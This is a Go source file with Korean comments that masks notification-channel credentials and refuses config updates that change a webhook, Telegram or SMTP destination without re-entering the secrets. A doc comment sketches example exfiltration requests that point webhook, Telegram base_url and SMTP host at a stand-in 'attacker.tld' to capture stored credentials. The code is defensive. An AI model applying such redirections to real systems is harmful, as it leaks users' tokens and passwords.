package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix는 마스킹 값의 접두사입니다. API는 실제 자격 증명 대신 이 접두사가 있는
// 값을 반환하고 갱신 API는 이를 기존 DB 값 유지로 해석합니다.
//
// 빈 값이나 고정 상수 대신 접두사를 써서 약간의 식별 정보(MaskedValue 참조)를 포함하면
// 사용자가 키를 다시 붙여 넣지 않아도 어느 봇인지 구분할 수 있습니다.
const MaskedPrefix = "__masked__"

// MaskedValue는 다음 마스킹 값을 생성합니다.
//
//	"__masked__"              원본이 짧아 식별 정보 없음
//	"__masked__:…ab12cd"      원본 마지막 6자리로 식별
//
// Webhook 식별 정보(WeCom key, Feishu 봇 id)는 끝에 있고 앞부분은
// 봇마다 같아 가치가 없으므로 마지막 6자리만 공개합니다.
// 자격 증명을 복원하기에는 부족하지만 설정자가 채널을 알아보는 데는 충분합니다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked는 API 반환 후 수정하지 않은 마스킹 값인지 확인합니다.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig는 설정 복사본의 자격 증명 필드를 마스킹합니다.
//
// 알 수 없는 유형은 자격 증명이 있을 수 있는 원본을 반환하지 않고 빈 map을 주어
// UI에서 설정 사용 불가로 표시하도록 합니다.
// 자격 증명이 아닌 필드는 UI 표시를 위해 그대로 유지합니다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 같은 중첩 구조는 전체를 자격 증명 하나로 취급합니다. 하위 키별 규칙을
		// 채널마다 다시 정의하는 복잡성이 이점보다 크기 때문입니다.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials는 대상 주소를 바꾸면서 자격 증명을 명시하지 않은 오류입니다.
// 조용히 허용하거나 자격 증명을 버리지 않는 이유는 PrepareConfigUpdate를 참고하세요.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 바뀐 목적지 키
	Missing []string // 명시하지 않은 자격 증명 키
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")도 새 값으로 다시 입력하거나 더 이상 필요 없으면 명시적으로 비우세요. " +
		"기존 자격 증명은 이전 주소에만 유효하며 재사용하면 새 주소에 전달됩니다."
}

// PrepareConfigUpdate는 채널 설정을 병합하며 보안에 민감한 대상 주소 변경을 처리합니다.
//
// 갱신 경로에서 단순 MergeConfig 대신 사용해 다음 경로를 막습니다.
// 대상 주소와 자격 증명은 독립 필드이며 MergeConfig는 언급하지 않은 키를
// 유지합니다. 채널 PATCH 권한자가 주소만 바꾸고 자격 증명을 생략하면
// 서버가 DB의 실제 자격 증명을 공격자 엔드포인트로 보낼 수 있습니다.
//
//	webhook  {config:{url:"https://attacker.tld"}} → 기존 Authorization 헤더 외부 전송
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<실제Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}} → STARTTLS 후 사용자명/비밀번호 전달
//
// 리디렉션 없이 조용히 발생하므로 호스트 간 이동 차단으로 막을 수 없으며
// 브라우저에 자격 증명을 노출하지 않는다는 마스킹 목적을 무너뜨립니다.
//
// 규칙: 목적지 키 하나라도 바뀌면 모든 자격 증명 키를 명시해야 합니다.
//   - 새 값 → 새 값 사용
//   - 명시적 빈 문자열 → 자격 증명 불필요, 지우기 유지
//   - 마스킹 값 그대로 또는 키 생략 → 거부
//
// 마스킹은 기존 자격 증명 유지라는 뜻이고 기존 값은 이전 주소에만 유효하므로 거부합니다.
// 자격 증명을 자동으로 버리지도 않습니다. 선택 필드(webhook headers, email password)를
// 조용히 버리면 인증은 사라졌는데 API는 200을 반환해 더 조사하기 어렵습니다.
// 따라서 운영자가 다시 입력하도록 합니다.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("채널 유형 %q가 등록되지 않았습니다", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열이 아닌 자격 증명(headers 객체 등) 안에 마스킹 리터럴이 있으면
	// 기존 값 유지 표식을 구조체 안에 넣은 것입니다. MergeConfig는 접두사 있는 문자열만
	// 마스킹으로 인식하므로 이런 객체는 그대로 저장되어 DB에 실제로
	// __masked__가 들어가고 오류 없이 인증이 실패합니다. 따라서 거부합니다.
	//
	// 주소가 그대로면 조기 반환하므로 이 검사는 가장 먼저 해야 합니다.
	// 뒤에 두면 주소 변경 경로만 검사하게 되며 초기 구현의 이 실수를 테스트가 찾아냈습니다.
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제 바뀐 목적지 키를 찾습니다. 마스킹 값은 변경 없음입니다.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소가 같으면 일반 병합: 마스킹은 유지, 빈 문자열은 삭제, 나머지는 덮어쓰기.
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 바뀌면 모든 자격 증명 키를 명시해야 합니다.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers는 문자열 아닌 구조 내부의 마스킹 표식 제출을 거부합니다.
//
// 마스킹은 값 전체가 문자열일 때만 성립합니다. webhook headers 같은 객체는
// 전체를 __masked__ 문자열로 마스킹하거나 전체 새 값을 제출해야 합니다.
// 객체 내부 표식은 유지 의미를 표현하지 못하고 실제 값으로 저장됩니다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("필드 %s 내부에 마스킹 표식 %q가 있습니다. 필드 전체를 생략해 기존 값을 유지하거나 전체 새 값을 제출하세요. 구조 내부에 마스킹 값을 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue는 JSON 직렬화로 설정 동등성을 비교해 프런트엔드 number와 DB float64처럼
// 직접 == 비교 시 틀릴 수 있는 유형 차이를 처리합니다.
//
// 빈 문자열과 키 없음은 같은 상태로 정규화해야 합니다. MergeConfig가 빈 문자열을
// 명시적 지우기로 해석해 키를 삭제하기 때문입니다. 정규화하지 않으면
// Telegram base_url처럼 선택 목적지 필드(비면 공식 주소 사용)가
// 다음 순서로 잘못 처리됩니다.
//
//	생성 시 base_url:"" 저장 → 첫 저장에서 MergeConfig가 키 삭제
//	→ 두 번째 저장은 입력 ""와 저장된 키 없음이 다르다고 판단
//	→ 자격 증명이 마스킹되어 대상 변경/자격 증명 재입력 400 오류
//
// 사용자는 아무것도 바꾸지 않았는데 매번 Bot Token을 다시 붙여 넣어야 합니다.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue는 설정 값이 빈 값인지 판단합니다.
// MergeConfig의 지우기 기준(strings.TrimSpace(s) == "")과 같아야
// 한쪽은 삭제, 다른 쪽은 값 있음으로 보는 불일치가 없습니다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig는 채널 갱신을 위해 incoming을 stored에 병합합니다.
//
// 규칙:
//   - incoming 마스킹 값 → stored 유지(미수정)
//   - incoming 빈 문자열 → 명시적 지우기로 키 삭제
//   - 나머지 → incoming으로 덮어쓰기
//   - stored에만 있는 키 → 유지(부분 갱신)
//
// 빈 문자열의 의미를 명확히 해야 합니다. 프런트엔드는 미입력 필드도 빈 값으로 보내므로
// 기존 값 유지와 지우기를 혼동할 수 있습니다.
// 여기서는 잘못 설정한 필드를 지울 방법을 제공하기 위해 명시적 지우기로 해석합니다.
// 키 생략으로 미제공과 빈 값 제공을 구분할 수 있지만 UI는 그 차이를 사용하지 않습니다.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 마스킹 값 = 미수정, stored 유지
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
